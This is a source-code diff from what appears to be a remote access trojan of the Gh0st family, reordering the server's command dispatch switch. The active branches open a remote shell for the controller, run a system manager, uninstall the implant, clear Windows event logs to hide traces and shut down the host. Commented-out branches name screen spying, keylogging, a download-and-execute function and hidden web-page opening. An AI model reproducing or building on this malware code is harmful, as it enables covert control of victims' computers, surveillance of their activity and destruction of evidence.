@@ -55,6 +55,28 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
 			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
 		break;
+	case COMMAND_SHELL: // 远程sehll
+		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
+			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
+		break;
+	case COMMAND_SYSTEM: 
+		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
+			(LPVOID)m_pClient->m_Socket, 0, NULL);
+		break;
+	case COMMAND_REMOVE: // 卸载,
+		UnInstallService();
+		break;
+	case COMMAND_CLEAN_EVENT: // 清除日志
+		CleanEvent();
+		break;
+	case COMMAND_SESSION:
+		CSystemManager::ShutdownWindows(lpBuffer[1]);
+		break;
+	case COMMAND_RENAME_REMARK: // 改备注
+		SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1));
+		break;
+	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
+		break;
 // 	case COMMAND_SCREEN_SPY: // 屏幕查看
 // 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
 // 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
@@ -68,34 +90,10 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 // 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 // 		break;
 
-
-
-
-
-
-
-
-	case COMMAND_SHELL: // 远程sehll
-		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
-			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
-		break;
-
-
-
-
-
-
-
-
-
 // 	case COMMAND_KEYBOARD: 
 // 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
 // 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 // 		break;
-	case COMMAND_SYSTEM: 
-		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
-			(LPVOID)m_pClient->m_Socket, 0, NULL);
-		break;
 
 // 	case COMMAND_DOWN_EXEC: // 下载者
 // 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
@@ -108,24 +106,12 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 // 	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
 // 		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
 // 		break;
-	case COMMAND_REMOVE: // 卸载,
-		UnInstallService();
-		break;
-	case COMMAND_CLEAN_EVENT: // 清除日志
-		CleanEvent();
-		break;
-	case COMMAND_SESSION:
-		CSystemManager::ShutdownWindows(lpBuffer[1]);
-		break;
-	case COMMAND_RENAME_REMARK: // 改备注
-		SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1));
-		break;
+	
 // 	case COMMAND_UPDATE_SERVER: // 更新服务端
 // 		if (UpdateServer((char *)lpBuffer + 1))
 // 			UnInstallService();
 // 		break;
-	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
-		break;
+	
 	}	
 }
 
